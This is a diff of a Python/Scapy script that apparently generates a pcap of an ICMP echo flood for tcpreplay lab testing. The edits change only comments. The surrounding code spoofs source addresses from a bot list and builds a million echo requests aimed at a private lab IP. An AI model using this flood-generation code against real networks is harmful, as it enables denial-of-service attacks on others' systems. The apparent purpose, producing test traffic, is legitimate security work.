@@ -3,7 +3,7 @@ import random
 import time
 import ipaddress
 
-# Tcpreplay ICMP Echo Flood (60 seconds)
+# Tcpreplay ICMP Echo Flood
 TARGET_IP = "192.168.100.2"
 BOTFILE = "../bots.txt"
 NUM_PACKETS = 1000000
@@ -28,7 +28,7 @@ def run_icmp_flood_attack():
         source_ip = random.choice(bot_ips)
         ip_layer = IP(src=source_ip, dst=TARGET_IP)
         eth_layer = Ether()
-        icmp_layer = ICMP(type=8, code=0)  # Echo Request, no payload
+        icmp_layer = ICMP(type=8, code=0)
         packet = eth_layer / ip_layer / icmp_layer
         lista_de_pacotes.append(packet)
         numero_de_pacotes_enviados += 1
@@ -50,4 +50,4 @@ def run_icmp_flood_attack():
 if __name__ == "__main__":
     run_icmp_flood_attack()
 
-# sudo PYTHONPATH=$HOME/scapy python3 create_pcap_tcpreplay_test_icmp_echo_flood.py
+# Comando: sudo PYTHONPATH=$HOME/scapy python3 create_pcap_tcpreplay_test_icmp_echo_flood.py
